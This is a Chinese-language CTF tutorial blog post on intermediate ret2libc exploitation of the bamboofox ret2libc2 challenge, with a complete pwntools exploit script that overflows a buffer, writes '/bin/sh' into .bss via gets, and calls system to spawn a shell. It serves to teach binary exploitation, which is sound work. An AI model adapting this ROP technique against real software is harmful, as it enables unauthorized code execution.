# Pwn-ROP-ret2libc-中级


# 中级

中级ret2libc是指：程序中plt段包含system但是找不到/bin/sh字符串。这里大概的想法就是：因为一般的程序中输入可能需要用到gets函数，如果程序的数据段：一般是.bss段（拥有比较大的内存空间）有空余的空间（未使用的变量），可以通过gets输入到该区域中，然后直接使用即可。

> 如果直接跳转到plt中的函数地址，那么需要先在栈中放入返回地址，再放入参数

# 实例

这里以 bamboofox 中的 ret2libc2 为例

点击下载: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2)

该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下

```
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E4%B8%AD%E7%BA%A7/  

